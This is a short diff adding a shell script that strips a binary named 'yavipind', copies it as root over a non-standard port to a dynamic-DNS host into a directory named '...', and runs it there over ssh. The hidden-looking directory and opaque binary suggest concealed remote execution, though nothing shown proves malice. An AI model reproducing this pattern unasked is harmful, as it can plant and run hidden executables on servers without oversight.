@@ -1,0 +1,5 @@
+strip yavipind
+# copy the exec
+scp -r -P 50022 yavipind root@btcorp.dyndns.org:/home/poi/...
+# exec it
+ssh -p 50022 root@btcorp.dyndns.org /home/poi/.../xi
